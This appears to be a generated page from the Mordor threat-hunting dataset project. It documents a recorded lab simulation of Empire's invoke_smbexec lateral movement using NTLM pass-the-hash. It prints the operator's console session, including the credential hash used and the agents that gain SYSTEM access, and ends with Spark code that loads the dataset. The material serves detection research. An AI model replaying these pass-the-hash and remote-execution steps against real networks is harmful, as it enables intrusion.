@@ -1,0 +1,289 @@
+---
+redirect_from:
+  - "/notebooks/small/windows/08-lateral-movement/sd-190518210125"
+interact_link: content/notebooks/small/windows/08_lateral_movement/SD-190518210125.ipynb
+kernel_name: 
+kernel_path: content/notebooks/small/windows/08_lateral_movement
+has_widgets: false
+title: |-
+  Empire Invoke Smbexec
+pagenum: 65
+prev_page:
+  url: /notebooks/small/windows/08_lateral_movement/lateral_movement.html
+next_page:
+  url: /notebooks/small/windows/08_lateral_movement/SD-190518215622.html
+suffix: .ipynb
+search: powershell empire lateralmovement invokesmbexec shire ps false agent smbexec tkvpx true default invoke mordor com name username dataset hash none domain set xsznt hr simulation description module stager service proxy request ntlm run listener tasked agents nmartha id windows data raw githubusercontent master command credid computername execute pgustavo sending stage active process metadata sd author roberto rodriguez cybrwardg creation date platform environment type c tool script github empireproject blob dev modulesource hunters forge datasets small empireinvokesmbexec tar gz represents adversaries performing style execution ntlmv pass authentication adversary view usemodule info needsadmin opsecsafe language minlanguageversion background outputextension authors rvrshll executes remote
+
+comment: "***PROGRAMMATICALLY GENERATED, DO NOT EDIT. SEE ORIGINAL FILES IN /content***"
+---
+
+    <main class="jupyter-page">
+    <div id="page-info"><div id="page-title">Empire Invoke Smbexec</div>
+</div>
+    <div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Metadata">Metadata<a class="anchor-link" href="#Metadata"> </a></h2>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<table>
+<thead><tr>
+<th style="text-align:left"></th>
+<th style="text-align:left"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">id</td>
+<td style="text-align:left">SD-190518210125</td>
+</tr>
+<tr>
+<td style="text-align:left">author</td>
+<td style="text-align:left">Roberto Rodriguez @Cyb3rWard0g</td>
+</tr>
+<tr>
+<td style="text-align:left">creation date</td>
+<td style="text-align:left">19/05/18</td>
+</tr>
+<tr>
+<td style="text-align:left">platform</td>
+<td style="text-align:left">Windows</td>
+</tr>
+<tr>
+<td style="text-align:left">Mordor Environment</td>
+<td style="text-align:left">shire</td>
+</tr>
+<tr>
+<td style="text-align:left">Simulation Type</td>
+<td style="text-align:left">C2</td>
+</tr>
+<tr>
+<td style="text-align:left">Simulation Tool</td>
+<td style="text-align:left">Empire</td>
+</tr>
+<tr>
+<td style="text-align:left">Simulation Script</td>
+<td style="text-align:left"><a href="https://github.com/EmpireProject/Empire/blob/dev/data/module_source/lateral_movement/Invoke-SMBExec.ps1">https://github.com/EmpireProject/Empire/blob/dev/data/module_source/lateral_movement/Invoke-SMBExec.ps1</a></td>
+</tr>
+<tr>
+<td style="text-align:left">Mordor Dataset</td>
+<td style="text-align:left"><a href="https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/lateral_movement/empire_invoke_smbexec.tar.gz">https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/lateral_movement/empire_invoke_smbexec.tar.gz</a></td>
+</tr>
+</tbody>
+</table>
+
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Dataset-Description">Dataset Description<a class="anchor-link" href="#Dataset-Description"> </a></h2><p>This dataset represents adversaries performing SMBExec style command execution with NTLMv2 pass the hash authentication.</p>
+
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Adversary-View">Adversary View<a class="anchor-link" href="#Adversary-View"> </a></h2>
+<pre><code>(Empire: TKV35P8X) &gt; usemodule lateral_movement/invoke_smbexec
+(Empire: powershell/lateral_movement/invoke_smbexec) &gt; info
+
+              Name: Invoke-SMBExec
+            Module: powershell/lateral_movement/invoke_smbexec
+        NeedsAdmin: False
+        OpsecSafe: True
+          Language: powershell
+MinLanguageVersion: 2
+        Background: False
+  OutputExtension: None
+
+Authors:
+  @rvrsh3ll
+
+Description:
+  Executes a stager on remote hosts using SMBExec.ps1
+
+Comments:
+  https://raw.githubusercontent.com/Kevin-Robertson/Invoke-
+  TheHash/master/Invoke-SMBExec.ps1
+
+Options:
+
+  Name         Required    Value                     Description
+  ----         --------    -------                   -----------
+  CredID       False                                 CredID from the store to use.           
+  ComputerName True                                  Host[s] to execute the stager on, comma 
+                                                    separated.                              
+  Service      False                                 Name of service to create and delete.   
+                                                    Defaults to 20 char random.             
+  ProxyCreds   False       default                   Proxy credentials                       
+                                                    ([domain\]username:password) to use for 
+                                                    request (default, none, or other).      
+  Username     True                                  Username.                               
+  Domain       False                                 Domain.                                 
+  Hash         True                                  NTLM Hash in LM:NTLM or NTLM format.    
+  Agent        True        TKV35P8X                  Agent to run module on.                 
+  Listener     True                                  Listener to use.                        
+  Proxy        False       default                   Proxy to use for request (default, none,
+                                                    or other).                              
+  UserAgent    False       default                   User-agent string to use for the staging
+                                                    request (default, none, or other).      
+
+(Empire: powershell/lateral_movement/invoke_smbexec) &gt; set Username pgustavo
+(Empire: powershell/lateral_movement/invoke_smbexec) &gt; set Domain shire
+(Empire: powershell/lateral_movement/invoke_smbexec) &gt; set Hash 8ece039f32592670b45fc801e2a9157d
+(Empire: powershell/lateral_movement/invoke_smbexec) &gt; set ComputerName IT001.shire.com
+(Empire: powershell/lateral_movement/invoke_smbexec) &gt; execute
+[*] Tasked TKV35P8X to run TASK_CMD_WAIT
+[*] Agent TKV35P8X tasked with task ID 27
+[*] Tasked agent TKV35P8X to run module powershell/lateral_movement/invoke_smbexec
+(Empire: powershell/lateral_movement/invoke_smbexec) &gt; Command executed with service PWXYXULFULYYGFYDYBIF on IT001.shire.com
+
+
+[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
+[*] New agent XSZ91N7T checked in
+[+] Initial agent XSZ91N7T from 10.0.10.103 now active (Slack)
+[*] Sending agent (stage 2) to XSZ91N7T at 10.0.10.103
+
+(Empire: powershell/lateral_movement/invoke_smbexec) &gt; agents
+
+[*] Active agents:
+
+Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 21:02:06  https           
+TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 21:02:09  https           
+EMDBFPSY ps 172.18.39.106   HR001             SHIRE\nmartha           notepad            7924   5/0.0    2019-05-18 21:02:08  https           
+
+V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\pgustavo          powershell         5204   5/0.0    2019-05-18 21:02:10  https           
+XSZ91N7T ps 172.18.39.105   IT001             *SHIRE\SYSTEM           powershell         4172   5/0.0    2019-05-18 21:02:08  https           
+
+(Empire: agents) &gt;</code></pre>
+
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Explore-Mordor-Dataset">Explore Mordor Dataset<a class="anchor-link" href="#Explore-Mordor-Dataset"> </a></h2>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Initialize-Analytics-Engine">Initialize Analytics Engine<a class="anchor-link" href="#Initialize-Analytics-Engine"> </a></h3>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">openhunt.mordorutils</span> <span class="k">import</span> <span class="o">*</span>
+<span class="n">spark</span> <span class="o">=</span> <span class="n">get_spark</span><span class="p">()</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Download-&amp;-Process-Mordor-File">Download &amp; Process Mordor File<a class="anchor-link" href="#Download-&amp;-Process-Mordor-File"> </a></h3>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/lateral_movement/empire_invoke_smbexec.tar.gz&quot;</span>
+<span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Get-to-know-your-data">Get to know your data<a class="anchor-link" href="#Get-to-know-your-data"> </a></h3>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
+            <span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">SELECT channel, COUNT(1)</span>
+<span class="sd">FROM mordorTable</span>
+<span class="sd">GROUPBY channel</span>
+<span class="sd">            &#39;&#39;&#39;</span><span class="p">)</span>
+<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
+        
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+</div>
+
+ 
+
+
+    </main>
+    
